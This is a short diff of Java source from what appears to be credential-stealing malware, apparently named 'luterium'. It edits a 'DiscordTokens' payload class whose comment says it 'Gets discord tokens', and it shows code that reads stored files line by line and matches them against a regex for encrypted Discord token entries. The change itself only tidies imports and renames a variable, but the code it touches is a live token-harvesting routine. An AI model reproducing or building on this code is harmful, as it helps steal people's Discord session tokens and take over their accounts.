@@ -4,8 +4,7 @@ import dev.peter.luterium.Main;
 import dev.peter.luterium.payload.PayloadExecutor;
 
 import java.io.*;
-import java.util.ArrayList;
-import java.util.List;
+import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -48,8 +47,8 @@ public class DiscordTokens implements PayloadExecutor { //Gets discord tokens.
 
                             String strLine;
                             while ((strLine = br.readLine()) != null) {
-                                Pattern p = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
-                                Matcher m = p.matcher(strLine);
+                                Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
+                                Matcher m = pattern.matcher(strLine);
 
                                 while (m.find()) {
                                     if (cx > 0) {
